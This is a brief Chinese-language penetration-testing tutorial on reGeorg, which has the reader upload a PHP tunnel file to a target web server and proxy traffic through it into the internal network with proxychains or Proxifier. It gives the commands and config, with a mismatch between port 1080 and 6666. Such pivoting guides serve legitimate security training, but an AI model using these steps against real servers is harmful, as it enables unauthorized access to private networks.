# reGeorg

> 原文：[https://www.zhihuifly.com/t/topic/3452](https://www.zhihuifly.com/t/topic/3452)

# reGeorg

reGeory适用于公网服务器只开放了80端口的情况。

reGeorg是用 python 写的利用Web进行代理的工具，流量只通过 http 传输，也就是http隧道。

```
reGeorg 下载https://github.com/sensepost/reGeorg 
```

![image](img/38d8bb8575075035a19f64a967cf6712.png)
![image](img/dd55179f03eeb9fbf5c630a7b662e74a.png)

上传对应语言版本的tunnel文件到服务器上。然后本地访问上传的源文件，即可在本地与远程主机上形成一个http的回路。命令如下：

```
python reGeorgSocksProxy.py -p 6666 -u http://目标站点/xxx.php //端口随便指定，只要不与本机开放端口冲突即可 
```

## Proxychains代理及配置方法

配置**proxychains**代理链的配置文件

***vim /etc/proxychains.conf*** ，将代理设置成本机的1080端口：

```
socks5 127.0.0.1 6666 
```

然后命令前面加上 **proxychains**即可。如：

```
proxychains curl 内网ip 
```

## Proxifier代理及配置方法

> 以上proxychains工具大多数情况下在mac/linux上使用，Windows下可以使用proxifier

*   创建代理服务器

![image](img/de515283883c56a7274c58463a6ff66a.png)

![image](img/2e0f408c50eb25f7ed97e340c60e89b1.png)

*   设置代理规则

![image](img/0823b0c72a0e3a892cf4451748a33b76.png)

![image](img/739692a42b494f1b269dbda1e23e25f2.png)

![image](img/36ae970cb4170e9457d5fe7e976f2b4c.png)

选中刚设置好的代理服务器就行了

所以我们流量的走向是： 流量->本地1080端口->web服务器的80端口(通过我们上传的php文件进行流量转发)->内网服务器->web服务器的80端口->本地1080端口